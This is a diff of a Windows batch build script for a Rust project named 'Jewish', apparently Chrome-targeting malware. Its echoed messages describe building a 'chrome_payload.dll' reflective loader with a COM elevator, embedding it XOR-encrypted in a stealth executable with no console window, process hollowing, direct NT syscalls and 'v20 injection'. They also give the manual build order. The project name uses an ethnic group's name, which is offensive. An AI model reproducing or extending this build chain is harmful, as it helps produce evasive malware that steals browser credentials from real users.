@@ -3,7 +3,8 @@ setlocal enabledelayedexpansion
 
 echo.
 echo ============================================================
-echo   Jewish v1 - Stealth single-exe build
+echo   Jewish v3 - Release build
+echo   chrome_payload.dll -^> XOR embed -^> jewish.exe
 echo ============================================================
 echo.
 
@@ -19,8 +20,11 @@ call :do_build
 if errorlevel 1 exit /b 1
 
 echo.
-echo [OK] Build complete - release\jewish.exe
-echo     Single file, payload embedded, no console window.
+echo [OK] Build complete
+echo     Output: release\jewish.exe
+echo     - chrome_payload.dll built separately, XOR-encrypted by build.rs
+echo     - Reflective hollowing + direct NT syscalls (inject crate)
+echo     - Single exe, no console window
 echo.
 pause
 exit /b 0
@@ -29,6 +33,7 @@ exit /b 0
 where rustc >nul 2>&1
 if not errorlevel 1 (
     echo [OK] Rust found
+    rustup show active-toolchain 2>nul
     exit /b 0
 )
 echo [*] Downloading Rust...
@@ -111,24 +116,46 @@ exit /b 0
 :do_build
 cd /d "%~dp0"
 
-echo [*] Building payload DLL (required for v20 injection)...
-cargo build --release -p chrome-payload || goto build_fail
+echo [*] Step 1/2: chrome-payload (reflective loader + COM elevator)...
+cargo build --release -p chrome-payload
+if errorlevel 1 goto build_fail
 if not exist "target\release\chrome_payload.dll" (
     echo [X] target\release\chrome_payload.dll missing after payload build
+    echo     Expected crate output name: chrome_payload.dll
     pause
     exit /b 1
 )
-for %%F in ("target\release\chrome_payload.dll") do echo     payload: %%~zF bytes
+for %%F in ("target\release\chrome_payload.dll") do echo     payload DLL: %%~zF bytes
 
-echo [*] Building jewish.exe (embedding payload)...
-echo     Final link step may sit at 237/238 for ~30-90s — normal.
-cargo build --release -p jewish || goto build_fail
+echo.
+echo [*] Step 2/2: jewish.exe (build.rs embeds XOR-encrypted payload)...
+echo     inject crate is built automatically as a dependency.
+echo     Final link step may pause at 237/238 for 30-90s — normal.
+cargo build --release -p jewish
+if errorlevel 1 goto build_fail
+if not exist "target\release\jewish.exe" (
+    echo [X] target\release\jewish.exe missing after main build
+    pause
+    exit /b 1
+)
 
 if not exist release mkdir release
-copy /Y "target\release\jewish.exe" "release\" >nul
+copy /Y "target\release\jewish.exe" "release\jewish.exe" >nul
+if errorlevel 1 goto build_fail
+
+for %%F in ("release\jewish.exe") do echo     release\jewish.exe: %%~zF bytes
 exit /b 0
 
 :build_fail
+echo.
 echo [X] Build failed
+echo.
+echo     Manual build order:
+echo       cargo build --release -p chrome-payload
+echo       cargo build --release -p jewish
+echo.
+echo     build.rs reads target\release\chrome_payload.dll and writes payload.enc
+echo     into OUT_DIR before linking jewish.exe.
+echo.
 pause
 exit /b 1
